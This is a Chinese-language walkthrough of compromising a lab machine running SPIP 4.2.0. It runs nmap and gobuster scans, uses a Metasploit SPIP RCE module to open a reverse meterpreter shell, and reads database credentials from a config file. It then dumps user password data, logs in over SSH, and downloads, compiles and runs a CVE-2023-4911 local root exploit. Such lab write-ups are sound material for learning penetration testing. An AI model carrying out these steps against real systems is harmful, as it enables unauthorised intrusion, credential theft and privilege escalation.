# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24                        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-08 11:20 EDT
Nmap scan report for 192.168.21.6
Host is up (0.00011s latency).
MAC Address: 08:00:27:49:06:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.7
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 3.43 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.6
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-08 11:22 EDT
Nmap scan report for 192.168.21.6
Host is up (0.00029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c0:f6:a1:6a:53:72:be:8d:c2:34:11:e7:e4:9c:94:75 (ECDSA)
|_  256 32:1c:f5:df:16:c7:c1:99:2c:d6:26:93:5a:43:57:59 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-generator: SPIP 4.2.0
|_http-title: Mi sitio SPIP
MAC Address: 08:00:27:49:06:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.29 ms 192.168.21.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.6 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,zip,git,jpg,png
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,zip,git,jpg,png
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 7519]
/local                (Status: 301) [Size: 312] [--> http://192.168.21.6/local/]                                                          
/javascript           (Status: 301) [Size: 317] [--> http://192.168.21.6/javascript/]                                                     
/vendor               (Status: 301) [Size: 313] [--> http://192.168.21.6/vendor/]                                                         
/config               (Status: 301) [Size: 313] [--> http://192.168.21.6/config/]                                                         
/tmp                  (Status: 301) [Size: 310] [--> http://192.168.21.6/tmp/]                                                            
/spip.png             (Status: 200) [Size: 1212]
/spip.php             (Status: 200) [Size: 7518]
/htaccess.txt         (Status: 200) [Size: 4307]
/ecrire               (Status: 301) [Size: 313] [--> http://192.168.21.6/ecrire/]                                                         
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/prive                (Status: 301) [Size: 312] [--> http://192.168.21.6/prive/]                                                          
/server-status        (Status: 403) [Size: 277]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 277]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

发现cms是spip4.2.0，寻找对应漏洞尝试利用一下

```
msf6 exploit(multi/http/spip_rce_form) > options 

Module options (exploit/multi/http/spip_rce_form):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format ty
                                         pe:host:port[,type:host:po
                                         rt][...]. Supported proxie
                                         s: sapni, socks4, socks5,
                                         socks5h, http
   RHOSTS                      yes       The target host(s), see ht
                                         tps://docs.metasploit.com/
                                         docs/using-metasploit/basi
                                         cs/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outg
                                         oing connections
   TARGETURI  /                yes       Path to Spip install
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.21.7     yes       The listen address (an interfa
                                     ce may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/spip_rce_form) > set rhosts 192.168.21.6
rhosts => 192.168.21.6
msf6 exploit(multi/http/spip_rce_form) > run
[*] Started reverse TCP handler on 192.168.21.7:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] The target appears to be vulnerable. The detected SPIP version (4.2.0) is vulnerable.
[*] Got anti-csrf token: iYe2q77AjJpzr7DiCN466DffCNPeUp0xMFqKM8HZ2jA5IWNjp6Vhzoioj1CV4d/wM8wzPYKIJAYCiLEY+fBNfgPHcNshG3+b
[*] 192.168.21.6:80 - Attempting to exploit...
[*] Sending stage (40004 bytes) to 192.168.21.6
[*] Meterpreter session 1 opened (192.168.21.7:4444 -> 192.168.21.6:59296) at 2026-03-08 11:54:50 -0400
meterpreter > shell
Process 2084 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

把shell弹回来

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.21.7] from (UNKNOWN) [192.168.21.6] 54148
bash: cannot set terminal process group (831): Inappropriate ioctl for device
bash: no job control in this shell
www-data@pipy:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

寻找到了数据库的账号密码

```
www-data@pipy:/var/www/html/config$ cat connect.php
cat connect.php
<?php
if (!defined("_ECRIRE_INC_VERSION")) return;
defined('_MYSQL_SET_SQL_MODE') || define('_MYSQL_SET_SQL_MODE',true);
$GLOBALS['spip_connect_version'] = 0.8;
spip_connect_db('localhost','','root','dbpassword','spip','mysql', 'spip','','');
```

查看一下数据库

```
www-data@pipy:/var/www/html/config$ mysql -u root -p
mysql -u root -p
Enter password: dbpassword

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 47
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| spip               |
| sys                |
+--------------------+
5 rows in set (0.001 sec)

MariaDB [(none)]> use spip
use spip
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [spip]> show tables;
show tables;
+-------------------------+
| Tables_in_spip          |
+-------------------------+
| spip_articles           |
| spip_auteurs            |
| spip_auteurs_liens      |
| spip_depots             |
| spip_depots_plugins     |
| spip_documents          |
| spip_documents_liens    |
| spip_forum              |
| spip_groupes_mots       |
| spip_jobs               |
| spip_jobs_liens         |
| spip_meta               |
| spip_mots               |
| spip_mots_liens         |
| spip_paquets            |
| spip_plugins            |
| spip_referers           |
| spip_referers_articles  |
| spip_resultats          |
| spip_rubriques          |
| spip_syndic             |
| spip_syndic_articles    |
| spip_types_documents    |
| spip_urls               |
| spip_versions           |
| spip_versions_fragments |
| spip_visites            |
| spip_visites_articles   |
+-------------------------+
28 rows in set (0.000 sec)
MariaDB [spip]> select * from spip_auteurs;
select * from spip_auteurs;
+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id_auteur | nom    | bio | email           | nom_site | url_site | login  | pass                                                         | low_sec | statut    | webmestre | maj                 | pgp | htpass | en_ligne            | alea_actuel                       | alea_futur                       | prefs                                                                                                               | cookie_oubli                                                                                                                                         | source | lang | imessage | backup_cles                                                                                                                                                                                                                                                                  |
+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|         1 | Angela |     | angela@pipy.htb |          |          | angela | 4ng3l4                                                       |         | 0minirezo | oui       | 2023-10-04 17:28:39 |     |        | 2023-10-04 13:50:34 | 387046876651c39a45bc836.13502903  | 465278670651d6da4349d85.01841245 | a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";} | NULL                                                                                                                                                 | spip   |      |          | 3HnqCYcjg+hKOjCODrOTwhvDGXqQ34zRxFmdchyPL7wVRW3zsPwE6+4q0GlAPo4b4OGRmzvR6NNFdEjARDtoeIAxH88cQZt2H3ENUggrz99vFfCmWHIdJgSDSOI3A3nmnfEg43BDP4q9co/AP0XIlGzGteMiSJwc0fCXOCxzCW9NwvzJYM/u/8cWGGdRALd7fzFYhOY6DmokVnIlwauc8/lwRyNbam1H6+g5ju57cI8Dzll+pCMUPhhti9RvC3WNzC2IUcPnHEM= |
|         2 | admin  |     | admin@pipy.htb  |          |          | admin  | $2y$10$.GR/i2bwnVInUmzdzSi10u66AKUUWGGDBNnA7IuIeZBZVtFMqTsZ2 |         | 1comite   | non       | 2023-10-04 17:31:03 |     |        | 2023-10-04 17:31:03 | 1540227024651d7e881c21a5.84797952 | 439334464651da1526dbb90.67439545 | a:4:{s:7:"couleur";i:2;s:7:"display";i:2;s:18:"display_navigation";s:22:"navigation_avec_icones";s:3:"cnx";s:0:"";} | 1118839.6HqFdtVwUs3T6+AJRJOdnZG6GFPNzl4/wAh9i0D1bqfjYKMJSG63z4KPzonGgNUHz+NmYNLbcIM83Tilz5NYrlGKbw4/cDDBE1mXohDXwEDagYuW2kAUYeqd8y5XqDogNsLGEJIzn0o= | spip   | fr   | oui      |                                                                                                                                                                                                                                                                              |
+-----------+--------+-----+-----------------+----------+----------+--------+--------------------------------------------------------------+---------+-----------+-----------+---------------------+-----+--------+---------------------+-----------------------------------+----------------------------------+---------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------+--------+------+----------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
2 rows in set (0.000 sec)
```

登录到angela用户

```
┌──(kali㉿kali)-[~]
└─$ ssh angela@192.168.21.6                                      
The authenticity of host '192.168.21.6 (192.168.21.6)' can't be established.
ED25519 key fingerprint is SHA256:aScYbZLUuamn6QKwvYnkrP4X2B6mlgWD8lyjuNH/dSc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.21.6' (ED25519) to the list of known hosts.
angela@192.168.21.6's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar  8 04:17:41 PM UTC 2026

  System load:  0.0               Processes:               128
  Usage of /:   84.6% of 8.02GB   Users logged in:         0
  Memory usage: 43%               IPv4 address for enp0s3: 192.168.21.6
  Swap usage:   0%

  => There is 1 zombie process.

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

23 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Oct  5 14:13:59 2023 from 192.168.0.130
angela@pipy:~$ id
uid=1000(angela) gid=1000(angela) groups=1000(angela)
```

最后看大佬说CVE-2023-4911

```
angela@pipy:~$ wget http://192.168.21.7/main.zip
--2026-03-08 16:41:28--  http://192.168.21.7/main.zip
Connecting to 192.168.21.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3044 (3.0K) [application/zip]
Saving to: ‘main.zip’

main.zip          100%[==========>]   2.97K  --.-KB/s    in 0s      

2026-03-08 16:41:28 (420 MB/s) - ‘main.zip’ saved [3044/3044]

angela@pipy:~$ ls -la
total 136
drwxr-x--- 6 angela angela  4096 Mar  8 16:41 .
drwxr-xr-x 3 root   root    4096 Oct  4  2023 ..
lrwxrwxrwx 1 angela angela     9 Oct 17  2023 .bash_history -> /dev/null                                                                  
-rw-r--r-- 1 angela angela   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 angela angela  3771 Jan  6  2022 .bashrc
drwx------ 3 angela angela  4096 Oct  5  2023 .cache
-rwxrwxr-x 1 angela angela 90858 Mar  8 16:22 les.sh
drwxrwxr-x 3 angela angela  4096 Oct  3  2023 .local
-rw-rw-r-- 1 angela angela  3044 Mar  8 16:41 main.zip
-rw-r--r-- 1 angela angela   807 Jan  6  2022 .profile
drwx------ 3 angela angela  4096 Oct  3  2023 snap
drwx------ 2 angela angela  4096 Oct  2  2023 .ssh
-rw-r--r-- 1 angela angela     0 Oct  2  2023 .sudo_as_admin_successful
-rw------- 1 angela angela    33 Oct  5  2023 user.txt
angela@pipy:~$ unzip main.zip 
Archive:  main.zip
acf0d3a8bd4c437475a7c4c83f5790e53e8103cb
   creating: CVE-2023-4911-main/
  inflating: CVE-2023-4911-main/Makefile  
  inflating: CVE-2023-4911-main/README.md  
  inflating: CVE-2023-4911-main/exp.c  
  inflating: CVE-2023-4911-main/gen_libc.py
angela@pipy:~$ cd CVE-2023-4911-main/
angela@pipy:~/CVE-2023-4911-main$ make
gcc -o exp exp.c
python3 gen_libc.py
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/angela/.cache/.pwntools-cache-3.10/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[!] An issue occurred while checking PyPI
[*] You have the latest version of Pwntools (4.11.0)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
./exp
# id
uid=0(root) gid=0(root) groups=0(root),1000(angela)
```
